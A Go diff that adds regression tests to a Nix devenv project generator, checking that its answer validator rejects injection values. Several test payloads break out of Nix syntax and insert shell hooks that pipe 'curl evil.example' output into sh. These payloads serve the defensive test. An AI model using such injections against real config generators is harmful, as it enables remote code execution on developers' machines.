@@ -260,3 +260,90 @@ func TestValidateAnswers_AllValidServices(t *testing.T) {
 		})
 	}
 }
+
+// TestValidateAnswers_RejectsNixInjection is the regression test for values
+// that generators splice unquoted into devenv.nix. Each payload previously
+// passed ValidateAnswers and rendered attacker-controlled Nix code.
+func TestValidateAnswers_RejectsNixInjection(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name    string
+		answers types.WizardAnswers
+		want    string
+	}{
+		{
+			name: "service version",
+			answers: types.WizardAnswers{Services: []types.ServiceChoice{{
+				Name:    "postgres",
+				Version: "16; }; processes.pwn.exec = ''curl evil.example | sh''; services.zz = { enable = false; package = pkgs.hello",
+			}}},
+			want: "invalid postgres version",
+		},
+		{
+			name: "service setting",
+			answers: types.WizardAnswers{Services: []types.ServiceChoice{{
+				Name:     "redis",
+				Settings: map[string]string{"port": "6379; enterShell = \"x\""},
+			}}},
+			want: "invalid redis setting",
+		},
+		{
+			name: "language version",
+			answers: types.WizardAnswers{Languages: []types.LanguageChoice{{
+				Name:    "go",
+				Version: "1.24 ]; enterTest = ''curl evil | sh''; x = [ .0",
+			}}},
+			want: "invalid go version",
+		},
+		{
+			name: "language package manager",
+			answers: types.WizardAnswers{Languages: []types.LanguageChoice{{
+				Name:           "java",
+				PackageManager: "maven; x = 1",
+			}}},
+			want: "invalid java package manager",
+		},
+		{
+			name:    "extra package",
+			answers: types.WizardAnswers{ExtraPackages: []string{"hello ]; enterShell = \"curl evil | sh\"; x = [ pkgs.hello"}},
+			want:    "invalid package name",
+		},
+		{
+			name:    "env key",
+			answers: types.WizardAnswers{EnvVars: map[string]string{"X = 1; y": "v"}},
+			want:    "invalid environment variable name",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := devinit.ExportValidateAnswers(tt.answers)
+			if err == nil {
+				t.Fatal("ValidateAnswers accepted a Nix injection payload")
+			}
+			if !strings.Contains(err.Error(), tt.want) {
+				t.Errorf("error = %v, want it to mention %q", err, tt.want)
+			}
+		})
+	}
+}
+
+func TestValidateAnswers_AcceptsRealWorldValues(t *testing.T) {
+	t.Parallel()
+	answers := types.WizardAnswers{
+		Languages: []types.LanguageChoice{
+			{Name: "go", Version: "1.24.1"},
+			{Name: "javascript", Version: ">=18 <21", PackageManager: "pnpm"},
+			{Name: "rust", Version: "nightly-2024-01-01"},
+			{Name: "java", Version: "21", PackageManager: "gradle"},
+		},
+		Services: []types.ServiceChoice{
+			{Name: "postgres", Version: "16", Settings: map[string]string{"initial_db": "app_dev"}},
+		},
+		ExtraPackages: []string{"jq", "python3Packages.black", "gnu-sed"},
+		EnvVars:       map[string]string{"DATABASE_URL": "postgres://localhost/app; with spaces"},
+	}
+	if err := devinit.ExportValidateAnswers(answers); err != nil {
+		t.Errorf("ValidateAnswers rejected legitimate values: %v", err)
+	}
+}
